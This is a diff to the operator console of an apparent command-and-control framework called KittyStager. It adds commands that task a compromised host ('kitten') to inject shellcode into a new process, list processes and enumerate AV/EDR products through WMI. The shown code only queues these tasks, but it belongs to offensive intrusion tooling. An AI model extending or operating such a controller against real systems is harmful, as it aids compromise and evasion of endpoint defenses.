@@ -1,4 +1,4 @@
-package client
+package cli
 
 import (
 	"KittyStager/internal/task"
@@ -29,9 +29,10 @@ func completerInteract(d prompt.Document) []prompt.Suggest {
 	s := []prompt.Suggest{
 		{Text: "back", Description: "Go back to the main menu"},
 		{Text: "task", Description: "Get the tasks for the target"},
-		{Text: "payload", Description: "Host a payload"},
+		{Text: "shellcode", Description: "Inject shellcode in new process"},
 		{Text: "sleep", Description: "Set sleep time"},
-		{Text: "recon", Description: "Show recon information"},
+		{Text: "ps", Description: "Get process list"},
+		{Text: "av", Description: "Get AV/EDR with wmi"},
 		{Text: "info", Description: "Show the kitten info"},
 		{Text: "exit", Description: "Exit the program"},
 	}
@@ -79,13 +80,17 @@ func Cli() error {
 			if err != nil {
 				return err
 			}
-			//check if there is only one kitten
+			//check if there is only one kitten directly interact
 			if len(kittens) == 2 {
 				key := reflect.ValueOf(kittens).MapKeys()
 				//get key
-				err := interact(key[1].String())
-				if err != nil {
-					return err
+				for j := range key {
+					if kittens[key[j].String()].Alive {
+						err := interact(key[j].String())
+						if err != nil {
+							return err
+						}
+					}
 				}
 			} else {
 				err = printKittens(kittens)
@@ -144,13 +149,9 @@ func interact(kittenName string) error {
 			if err != nil {
 				return err
 			}
-			j, err := json.MarshalIndent(t, "", "  ")
-			if err != nil {
-				return err
-			}
-			fmt.Println(string(j))
-		case "payload":
-			fmt.Printf("%s\n", "Please enter the path to the payload")
+			printTasks(t)
+		case "shellcode":
+			fmt.Printf("%s\n", "Please enter the path to the shellcode")
 			var path string
 			path, err := i.Read("Path: ")
 			if err != nil {
@@ -184,18 +185,26 @@ func interact(kittenName string) error {
 			if err != nil {
 				return err
 			}
-		case "recon":
-			/*
-				t := task.Task{
-					Tag:     "recon",
-					Payload: nil,
-				}
-				err := createTask(&t, kittenName)
-				if err != nil {
-					return err
-				}
-			
-			*/
+		case "ps":
+			t := task.Task{
+				Tag:     "ps",
+				Payload: nil,
+			}
+			err := createTask(&t, kittenName)
+			if err != nil {
+				return err
+			}
+			go checkForResponse(kittenName)
+		case "av":
+			t := task.Task{
+				Tag:     "av",
+				Payload: nil,
+			}
+			err := createTask(&t, kittenName)
+			if err != nil {
+				return err
+			}
+			go checkForResponse(kittenName)
 		case "info":
 			kitten, err := getKitten(kittenName)
 			if err != nil {
